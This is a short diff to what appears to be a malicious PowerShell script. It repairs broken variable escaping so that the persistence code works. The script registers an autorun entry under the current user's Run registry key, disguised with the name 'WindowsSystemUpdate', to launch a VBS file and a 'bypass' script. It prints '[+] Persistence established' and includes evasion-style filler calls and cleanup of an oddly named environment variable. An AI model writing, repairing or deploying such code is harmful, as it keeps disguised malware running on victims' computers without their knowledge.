@@ -97,7 +97,7 @@ try {
         $regPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         $regName = "WindowsSystemUpdate"
         $regValue = "wscript.exe `"$vbsPath`" `"$bypassScriptPath`""
-        Set-ItemProperty -Path \$regPath -Name \$regName -Value \$regValue
+        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
         
         Write-Host '[+] Persistence established'
 
@@ -112,8 +112,8 @@ try {
 }
 
   Start-Sleep -Milliseconds 103
-  \$null = [Environment]::ProcessorCount
-  \$null = [System.Diagnostics.Process]::GetCurrentProcess().Id
+  $null = [Environment]::ProcessorCount
+  $null = [System.Diagnostics.Process]::GetCurrentProcess().Id
 }
 finally {
   Remove-Item Env:\Aqv027DF -ErrorAction SilentlyContinue
